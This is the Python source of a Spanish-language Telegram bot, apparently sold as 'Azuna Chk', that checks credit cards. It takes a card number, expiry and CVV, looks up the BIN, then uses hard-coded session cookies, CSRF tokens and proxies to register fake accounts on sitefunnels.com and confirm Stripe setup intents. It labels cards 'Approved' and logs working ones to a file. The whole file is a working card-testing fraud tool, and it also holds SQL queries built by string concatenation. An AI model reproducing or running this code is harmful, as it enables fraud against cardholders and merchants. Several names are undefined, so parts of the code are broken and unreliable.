import json
import requests
import time
import asyncio
import re
import colored 
from asyncio import sleep
import os
from pyrogram import Client, filters
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
) 
import names
import aiohttp
import codecs
import base64
from pyrogram import Client, filters
from pyrogram.types import Message
from pyrogram.types import (
    Message,
    InlineKeyboardButton,
    InlineKeyboardMarkup
)
from db import *
import random
from bs4 import BeautifulSoup
from user import*

# Establece los detalles de la conexión


# Establece los detalles de la conexión
def multiexplode(delimiters, string):
    """
    Separa una cadena en elementos utilizando múltiples delimitadores.

    :param delimiters: Lista de delimitadores como cadena o lista.
    :param string: Cadena a ser dividida.
    :return: Lista de elementos separados.
    """
    if isinstance(delimiters, str):
        delimiters = [delimiters]

    # Reemplazar todos los delimitadores por el primer delimitador
    current_delimiter = delimiters[0]
    for delimiter in delimiters[1:]:
        string = string.replace(delimiter, current_delimiter)

    # Dividir la cadena utilizando el primer delimitador
    return string.split(current_delimiter)

@Client.on_message(filters.command(["ki"], ["/", "."]))
async def ch(_, message: Message):

            username = message.from_user.username
            chat_id = message.chat.id
            user_id = (
        message.from_user.id
    )

            
# Obtener información del grupo
            queryGroups = "SELECT * FROM `groups` WHERE id=" + str(chat_id)
            cursorGroups = db.cursor()
            cursorGroups.execute(queryGroups)
            resultGroups = cursorGroups.fetchall()

# Obtener información del usuario
            queryUsers = "SELECT * FROM users WHERE user_id='" + str(user_id) + "'"
            cursorUsers = db.cursor()
            cursorUsers.execute(queryUsers)
            resultUsers = cursorUsers.fetchall()

            isPremium = False

# Verificar si el usuario es premium en la tabla "users" solo si no es premium en la tabla "groups"
            

            row = None  # Asignar un valor por defecto

            if not isPremium and len(resultUsers) > 0:
                row = resultUsers[0]
            if row and row[2] == 'Premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True
            
            # ...
            
            if len(resultGroups) > 0:
                row = resultGroups[0]
            if row and row[3] == 'premium':  # Verificar si 'row' tiene un valor antes de acceder a sus elementos
                isPremium = True

            

# Verificar si el bot se está utilizando en un grupo
            isGroupChat = message.chat.type == 'group'

            if not isPremium:
             message_text = "Para usar el bot"
    
             if isGroupChat:
              message_text += " en este grupo, debes comprar Azunachk. Por favor, ponte en contacto con los vendedores para obtener más información."
             else:
              message_text += ", debes comprar Azunachk. Por favor, ponte en contacto con los vendedores para obtener más información."
    
             await message.reply_text(f"<i>{message_text}</i>")
             return
            data = message.text.split(" ", 2)

            if len(data) < 2:
                await message.reply_text("""
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」 ━━━━
<i>♻️ Comando</i> <i>/el</i>
<i>🔰 Formato:</i> <code>cc|mm|yy|cvv</code>
<i>➤ Gateway:</i> <code>Braintree</code>
━━━━━「𝘼𝙯𝙪𝙣𝙖 𝘾𝙝𝙠」 ━━━━""")
                return

            ccs = data[1]
            card = multiexplode([":", "|", "/", " ","!"], ccs)
            cc = card[0]
            mes = card[1]
            if len(cc) != 16:
                await message.reply_text("Card Not Found. La tarjeta debe tener 16 dígitos.")
                return
            if len(mes) != 2:
                await message.reply_text("Card Not Found. mes inválido")
                return
            
            # Verificar si el año tiene 2 o 4 dígitos
            regex_pattern = r"\b\d{2}\b|\b\d{4}\b"
            match = re.search(regex_pattern, card[2])
        
            if match:
                ano = match.group()  # Obtener el año coincidente
            else:
                await message.reply_text("Formato de año no válido.")
                return
            
            cvv = card[3]
            bin_code = cc[:6]
            
            if len(cvv) != 3:
                await message.reply_text("Card Not Found. cvv inválido")
                return
            
            # Verificar si el bin está en la lista de bins prohibidos
            banned_file = "bin_banned.txt"
            if os.path.exists(banned_file):
                with open(banned_file, "r") as file:
                    banned_bins = file.read().splitlines()
                if bin_code in banned_bins:
                    await message.reply_text("Bin Banned")
                    return
   #dabese variable
            
            username = message.from_user.username
    
            user_id = (
        message.from_user.id
    )
         
        
           

    
    
            
                
                # Ejecuta una consulta SQL para buscar al usuario por su User ID
            query = f"SELECT status FROM users WHERE user_id='{user_id}'"
            cursor.execute(query)
                 
            # Obtiene el resultado de la consulta
            result = cursor.fetchone()
            if result is None:
             await message.reply_text( "No estás registrado. Por favor, utiliza /register para registrarte.")
             return  
                # Verifica el resultado y almacena el valor en la variable "rank"
            
            rank = result[0]
            if message.from_user.id in antispam_users and antispam_users[message.from_user.id] + 16 > int(time.time()):
             time_left = antispam_users[message.from_user.id] + 16 - int(time.time())
             await message.reply_text(f"❗️ [<i>ANTISPAM DETECTADO</i>]. Espera {time_left} segundos antes de enviar otro comando.")
             return 
            else:
             antispam_users[message.from_user.id] = int(time.time())

# ...

# Al final del procesamiento de mensajes, marcar al usuario como no antispam


                
            inputm = message.text.split(None, 1)[1]
            bincode = 6
            BIN = inputm[:bincode]
            req = requests.get(f"https://bins.antipublic.cc/bins/{BIN}").json()
            reply = await message.reply_text("<b>Cargando proceso...</b>")        
                 
            
            brand = req['brand']
            country = req['country']
            country_name = req['country_name']
            country_flag = req['country_flag']
            country_currencies = req['country_currencies']
            bank = req['bank']
            level = req['level']
            typea  = req['type']
            tiempo_inicio = time.perf_counter()
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Braintree</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]....■■□□□□□□□□ →20%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")
            tiempo_fin = time.perf_counter()
            duracion = tiempo_fin - tiempo_inicio
            tiempo = round(duracion, 2)  # Redondear a 2 decimales
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Braintree</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■□□□□□□□ →30%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""")


   
    #-----------------------------------------------------------------------------------------------
            headers = {
            'authority': 'sitefunnels.com',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
        }
    
            connector = aiohttp_socks.ProxyConnector.from_url(proxy)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.get('https://sitefunnels.com/sign-up/subscribe', headers=headers, ssl=False) as resp:
                    response = await resp.text()
            soup = BeautifulSoup(response , 'html.parser')
            formid = soup.find_all("input", {"name": "formid"})[0]["value"]
            
            cookies = {
                'INGRESSCOOKIE': '12DF2033E7A138113865F63C82D329BF',
                '_ga_KZBHSTYE5V': 'GS1.1.1691127551.1.0.1691127551.0.0.0',
                '_ga': 'GA1.1.717975341.1691127552',
                '_csrfToken': 'mNgdIF-q8hCTr-cJIRbf-965.5660.191119.122580798',
                '_fbp': 'fb.1.1691127552122.917586407',
            }
    
            headers = {
                'authority': 'sitefunnels.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'INGRESSCOOKIE=12DF2033E7A138113865F63C82D329BF; _ga_KZBHSTYE5V=GS1.1.1691127551.1.0.1691127551.0.0.0; _ga=GA1.1.717975341.1691127552; _csrfToken=mNgdIF-q8hCTr-cJIRbf-965.5660.191119.122580798; _fbp=fb.1.1691127552122.917586407',
                'origin': 'https://sitefunnels.com',
                'referer': 'https://sitefunnels.com/sign-up/subscribe',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
                'x-requested-with': 'XMLHttpRequest',
            }
    
            data = {
                'action': 'subscriptionWidgetReq',
                '_csrfToken': 'mNgdIF-q8hCTr-cJIRbf-965.5660.191119.122580798',
                'r': '0.6084915116042013',
                'widgetAction': 'getStripeToken',
                'amount': '0',
                'form': formid,
            }
    
            connector = aiohttp_socks.ProxyConnector.from_url(proxy)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post('https://sitefunnels.com/clientRequestHandler/', cookies=cookies, headers=headers, data=data, ssl=False) as resp2:
                    response = await resp2.json()
            seti = response['data']['token']
            seti_ = str(seti).split("_secret_")[0]
            
            print(seti_)
            print(seti)
    
            cookies = {
                'INGRESSCOOKIE': '12DF2033E7A138113865F63C82D329BF',
                '_ga_KZBHSTYE5V': 'GS1.1.1691127551.1.0.1691127551.0.0.0',
                '_ga': 'GA1.1.717975341.1691127552',
                '_csrfToken': 'mNgdIF-q8hCTr-cJIRbf-965.5660.191119.122580798',
                '_fbp': 'fb.1.1691127552122.917586407',
                '__stripe_mid': '2c1b429b-f6ba-40aa-bd1c-acf3f8f685cfd1b71b',
                '__stripe_sid': '6a1844e9-a498-41a1-958e-01494150c27f099ac4',
            }
    
            headers = {
                'authority': 'sitefunnels.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'INGRESSCOOKIE=12DF2033E7A138113865F63C82D329BF; _ga_KZBHSTYE5V=GS1.1.1691127551.1.0.1691127551.0.0.0; _ga=GA1.1.717975341.1691127552; _csrfToken=mNgdIF-q8hCTr-cJIRbf-965.5660.191119.122580798; _fbp=fb.1.1691127552122.917586407; __stripe_mid=2c1b429b-f6ba-40aa-bd1c-acf3f8f685cfd1b71b; __stripe_sid=6a1844e9-a498-41a1-958e-01494150c27f099ac4',
                'origin': 'https://sitefunnels.com',
                'referer': 'https://sitefunnels.com/sign-up/subscribe',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
                'x-requested-with': 'XMLHttpRequest',
            }
    
            data = {
                'action': 'subscriptionWidgetReq',
                '_csrfToken': 'mNgdIF-q8hCTr-cJIRbf-965.5660.191119.122580798',
                'r': '0.2931705076986555',
                'widgetAction': 'checkAccountDetails',
                'form': formid,
                'name': nombre,
                'email': CorreoRand,
                'password': f'kurama#{telephone}',
                'login': 'false',
            }
    
            connector = aiohttp_socks.ProxyConnector.from_url(proxy)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post('https://sitefunnels.com/clientRequestHandler/', cookies=cookies, headers=headers, data=data, ssl=False) as resp3:
                    response = await resp3.json()
            
            cookies = {
                'INGRESSCOOKIE': '12DF2033E7A138113865F63C82D329BF',
                '_ga_KZBHSTYE5V': 'GS1.1.1691127551.1.0.1691127551.0.0.0',
                '_ga': 'GA1.1.717975341.1691127552',
                '_csrfToken': 'mNgdIF-q8hCTr-cJIRbf-965.5660.191119.122580798',
                '_fbp': 'fb.1.1691127552122.917586407',
                '__stripe_mid': '2c1b429b-f6ba-40aa-bd1c-acf3f8f685cfd1b71b',
                '__stripe_sid': '6a1844e9-a498-41a1-958e-01494150c27f099ac4',
            }
    
            headers = {
                'authority': 'sitefunnels.com',
                'accept': '*/*',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                # 'cookie': 'INGRESSCOOKIE=12DF2033E7A138113865F63C82D329BF; _ga_KZBHSTYE5V=GS1.1.1691127551.1.0.1691127551.0.0.0; _ga=GA1.1.717975341.1691127552; _csrfToken=mNgdIF-q8hCTr-cJIRbf-965.5660.191119.122580798; _fbp=fb.1.1691127552122.917586407; __stripe_mid=2c1b429b-f6ba-40aa-bd1c-acf3f8f685cfd1b71b; __stripe_sid=6a1844e9-a498-41a1-958e-01494150c27f099ac4',
                'origin': 'https://sitefunnels.com',
                'referer': 'https://sitefunnels.com/sign-up/subscribe',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-origin',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
                'x-requested-with': 'XMLHttpRequest',
            }
    
            data = {
                'action': 'subscriptionWidgetReq',
                '_csrfToken': 'mNgdIF-q8hCTr-cJIRbf-965.5660.191119.122580798',
                'r': '0.4808688501929925',
                'widgetAction': 'subscribe',
                'form': formid,
                'bumps': '[]',
                'selectedPeriod': 'yearly',
                'selectedPlan': '18127',
                'selectedDiscount': '',
                'templateId': '0',
                'funnelId': '0',
                'cc': '',
                'category': '',
                'timezone': 'UTC',
                'total': '0',
                'vatPercent': '0',
                'paymentData': f'{{"cardType":"","nonce":"{seti_}","paypalEmail":"","paypalCountry":"","lastTwo":""}}',
                'name': nombre,
                'email': CorreoRand,
                'password': f'kurama#{telephone}',
                'companyName': '',
                'companyId': '',
                'countryCode': 'US',
                'city': '-',
                'state': 'New York',
                'zip': '',
                'address': '-',
                'currentFunnel': '1',
                'currentFunnelStep': '2',
                'currentFunnelStepVariant': '2',
                'locale': '',
                'project': '-1',
            }
    
            connector = aiohttp_socks.ProxyConnector.from_url(proxy)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post('https://sitefunnels.com/clientRequestHandler/', cookies=cookies, headers=headers, data=data, ssl=False) as resp4:
                    response = await resp4.json()
            
                
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'accept-language': 'en-US,en;q=0.9',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'sec-ch-ua': '"Not/A)Brand";v="99", "Microsoft Edge";v="115", "Chromium";v="115"',
                'sec-ch-ua-mobile': '?0',
                'sec-ch-ua-platform': '"Windows"',
                'sec-fetch-dest': 'empty',
                'sec-fetch-mode': 'cors',
                'sec-fetch-site': 'same-site',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36 Edg/115.0.1901.188',
            }
    
            data = f'return_url=https%3A%2F%2Fsitefunnels.com%2F_service%2Fprocessing%3Ftype%3Dstripe-widget&payment_method_data[billing_details][name]={nombre}&payment_method_data[billing_details][email]={CorreoRand}&payment_method_data[billing_details][address][country]=US&payment_method_data[billing_details][address][state]=New+York&payment_method_data[billing_details][address][postal_code]=10080&payment_method_data[type]=card&payment_method_data[card][number]={cc}&payment_method_data[card][cvc]={cvv}&payment_method_data[card][exp_year]={ano}&payment_method_data[card][exp_month]={mes}&payment_method_data[pasted_fields]=number&payment_method_data[payment_user_agent]=stripe.js%2F310016d8ed%3B+stripe-js-v3%2F310016d8ed%3B+payment-element&payment_method_data[time_on_page]=143375&payment_method_data[guid]=811f1f95-7a44-44fc-b6a7-8dacbd1b11e978a741&payment_method_data[muid]=2c1b429b-f6ba-40aa-bd1c-acf3f8f685cfd1b71b&payment_method_data[sid]=6a1844e9-a498-41a1-958e-01494150c27f099ac4&expected_payment_method_type=card&use_stripe_sdk=true&key=pk_live_xEPo417Sqpt7zP5M0W5ZLxPq&_stripe_account=acct_1HcwKlLt5US1Drj2&client_secret={seti}'
    
            connector = aiohttp_socks.ProxyConnector.from_url(proxy)
            async with aiohttp.ClientSession(connector=connector) as session:
                async with session.post(f'https://api.stripe.com/v1/setup_intents/{seti_}/confirm', headers=headers, data=data, ssl=False) as resp5:
                    response = await resp5.json()
    
                         
                                         
            await reply.edit_text(f"""
<code><i>Gateway ➤</i></code> <b>Braintree</b>
<i><b>➜[Credit Card] »</b></i><code>{cc}|{mes}|{ano}|{cvv}</code>
<i><b>➜[Loading]...■■■■■■■■■■→100%</b></i>
<i><b>➜[Time] » → {tiempo}</b></i>sg""") 
            
            if (int(response.find('Payment method successfully added')) > 0) or  (int(response.find('1000 Approved')) > 0):
                        print("Approved", "(1000) Approved")
                        msg = "Approved! ✅ "
                        respuesta = "(1000) Approved"
                        with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                                cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                                cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
            elif (int(response.find('Status code 2001: Insufficient Funds')) > 0) or (int(response.find('Status code avs: Gateway Rejected: avs')) > 0):
                for i in response.split("\n"):
                    if 'There was an error saving your payment method' in i:
                        Message = i.replace(f'There was an error saving your payment method. Reason: ',"").replace(" </li>","")
                print("Approved", Message)
                msg = "Approved! ✅ "
                respuesta = Message
                with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                        cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                        cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
            elif int(response.find('Status code risk_threshold:')) > 0 :
                print("Gateway Rejected: CHANGE BIN")
            elif int(response.find('There was an error saving your payment method')) > 0 :
                        for i in response.split("\n"):
                            if 'There was an error saving your payment method' in i:
                                
                                Message = i.replace(f'There was an error saving your payment method. Reason: ',"").replace(" </li>","")
                       
                        print(Message)
                        msg = "Declined! ❌"
                        respuesta = Message
                        if "Card Issuer Declined CVV" in respuesta:
                            with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                                cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                                cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
                            
                            antispam_users[message.from_user.id] = False
                            return await reply.edit_text(f"""   
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> Card Issuer Declined CVV</code>
<i>Gateway ➤</i> Braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""")
                        elif "CVV." in respuesta:
                                        with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                                            cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                                            cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
                                        antispam_users[message.from_user.id] = False
                                        return await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> Gateway Rejected: CVV</code>
<i>Gateway ➤</i> Braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""")
                        elif "Insufficient Funds" in respuesta:
                                        with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                                            cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                                            cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
                                        antispam_users[message.from_user.id] = False
                                        return await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> Insufficient Funds</code>
<i>Gateway ➤</i> Braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""")
                        elif "AVS." in respuesta: 
                         antispam_users[message.from_user.id] = False
                         return await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> Gateway Rejected: AVS</code>
<i>Gateway ➤</i> Braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""")
                        elif "AVS and CVV" in respuesta:
                                        with codecs.open('approved.txt', 'a', encoding='utf-8') as cards_file:
                                            cards_file.write(ccs.encode('utf-8').decode('utf-8') + '\n')
                                            cards_file.write(respuesta.encode('utf-8').decode('utf-8') + '\n')
                                        antispam_users[message.from_user.id] = False
                                        return await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>Approved! ✅</b> 
<i>Message ➤</i><code> Gateway Rejected: AVS and CVV</code>
<i>Gateway ➤</i> Braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""")
                                   
                        else :
                             msg ="Declined! ❌ "
                             respuesta = Message
                                   
                            
                                    
                            
            else :
               msg ="Declined! ❌ "
               respuesta = "Ha ocurrido un error inesperado."
                    
            await reply.edit_text(f"""
<i>Card ➤</i> <code>{cc}|{mes}|{ano}|{cvv}</code>
<i>Status ➤</i> <b>{msg}</b> 
<i>Message ➤</i><code> {respuesta}</code>
<i>Gateway ➤</i> braintree
━━━━━━━━━━━━
<i>Bin ➤</i> <code>{level} -  {type} [{country_flag}]</code>
<i>Bank ➤</i> <code>{bank}</code>
<i>Country ➤</i> <code>{country_name} - {country}</code>
━━━━━━━━━━━━
<i>Time ➤</i> <code>{tiempo}</code>sg
<i>User ➤</i> <i>{username}</i> [{rank}]
<i>Owner by ➤</i> <code>@Al3xCodex OR
@Angel70k</code>""") 
            

            
            